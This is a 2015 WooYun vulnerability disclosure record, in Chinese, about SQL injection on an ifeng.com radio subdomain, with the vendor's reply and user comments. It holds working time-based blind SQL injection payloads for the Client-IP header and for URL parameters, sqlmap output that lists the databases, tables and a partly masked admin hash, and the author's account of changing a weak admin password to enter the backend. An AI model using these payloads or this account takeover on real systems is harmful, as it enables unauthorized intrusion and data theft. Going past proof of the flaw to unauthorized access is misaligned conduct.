{"id": 46276, "wybug_id": "wooyun-2015-091828", "wybug_title": "凤凰网某站SQL注射影响大量数据库已进后台", "wybug_corp": "凤凰网", "wybug_author": "紫霞仙子", "wybug_date": "2015-01-14 15:26", "wybug_open_date": "2015-02-28 15:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向公众公开  简要描述： 233 详细说明：  \n两处，3个参数存在注射。第一个是个比较隐蔽的SQL注入点，不容易发现。1，http://diantai.ifeng.com:80/index.php/stat/viewStat 通过分析包，发现Client-IP: 存在问题GET /index.php/stat/clickStat HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Client-IP: if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/X-Requested-With: XMLHttpRequestReferer: http://diantai.ifeng.com/Cookie: userkey=426cb52b994f51bae72b76a7277aa8e4; PHPSESSID=8f8hji6daju4vldibgjih4hqi5Host: diantai.ifeng.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*通过响应时间来判断注入点存在：Client-IP:=if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'\"XOR(if(now()=sysdate(),sleep(10),0))OR\"*/ 返回时间 10.292 sClient-IP:=if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/ 返回时间 6.256 sClient-IP:=if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ 返回时间 0.234 s2，http://diantai.ifeng.com//pp.php?aid=562137&p=1-5886-562137&pf=webfm&s=1&t=p&v=1.0\n   漏洞证明：  \n---Parameter: Client-IP #2* ((custom) HEADER)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: if(now()=sysdate(),sleep(0),0)/'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"'||(SELECT 'pVNX' FROM DUAL WHERE 9170=9170 AND SLEEP(5))||'/Parameter: Client-IP #1* ((custom) HEADER)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: if(now()=sysdate(),sleep(0),0)/'||(SELECT 'ODiq' FROM DUAL WHERE 4655=4655 AND SLEEP(5))||''XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"/------Parameter: s (GET)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: aid=562137&p=1-5886-562137&pf=webfm&s=1' AND SLEEP(5) AND 'avie'='avie&t=p&v=1.0---back-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 121 HTTP(s) requests:---Parameter: v (GET)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: aid=562137&p=1-5886-562137&pf=webfm&s=1&t=p&v=1.0' AND SLEEP(5) AND 'qhrH'='qhrH---back-end DBMS: MySQL 5.0.11available databases [7]:[*] information_schema[*] mysql[*] performance_schema[*] sst[*] sst_stat[*] sst_stat2014[*] testDatabase: sst_stat[100 tables]+--------------------+| sst_stat_05\\x05    || sst_api_stat_00    || sst_clickstat_1411 || sst_clickstat_1412 || sst_stat_00        || sst_stat_01        || sst_stat_02        || sst_stat_03        || sst_stat_04        || sst_stat_06        || sst_stat_07        || sst_stat_08        || sst_stat_09        || sst_stat_10        || sst_stat_11        || sst_stat_12        || sst_stat_14        || sst_stat_15        || sst_stat_16        || sst_stat_17        || sst_stat_18        || sst_stat_19        || sst_stat_20        || sst_stat_21        || sst_stat_22        || sst_stat_23        || sst_stat_24        || sst_stat_25        || sst_stat_26        || sst_stat_27        || sst_stat_28        || sst_stat_29        |            贴出部分数据库找到管理员表：Database: sstTable: sst_admin[2 entries]+--------+---------+-----------+---------+----------+----------------------------------+------------+------------+---------------+| userid | groupid | publishid | percent | username | password                         | created_at | pwdexpires | lastlogintime |+--------+---------+-----------+---------+----------+----------------------------------+------------+------------+---------------+| 1      | 3       |           | 1       | admin    | f541558155e2a****888d19aa8 | 1335580011 | 2015-12-30 | 1413181850    |这里只贴出一个管理员信息。高权限的密码还没破出来,猜解了3天才40%，但是其他管理的账号就。。。。。弱口令，admin888    因为强制修改密码后才能登陆后台，所以我把密码改成了Admin888直接进后台：接近 17万 用户，增长速度看起来也不错。\n\n\n\n\n\n\n   修复方案：  其实我也听电台的。有什么问题可以私信我！求20rank !!!   版权声明：转载请注明来源 紫霞仙子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-14 17:39 厂商回复： 非常感谢，我们正在处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-14 15:46 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @凤凰网 - - 测试下邮件通知    \n     2015-01-14 16:06 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  邮件通知坏了？    \n     2015-01-14 16:28 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @紫霞仙子 没，改成萌妹形态了    \n     2015-01-14 16:34 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @疯狗 萌妹？求真相，发到沙龙群里让大家看看萌妹！    \n     2015-05-22 07:45 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  洞主这个　client-ip 的头部注入是你抓包 将client-ip出标为 * 之后sqlmap  -r 读取数据包  注入的？    \n     2015-05-22 08:28 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @Power 是的，    \n     2015-05-22 10:49 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @Power 注意收听，一会我发2个head的，可以参考下    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}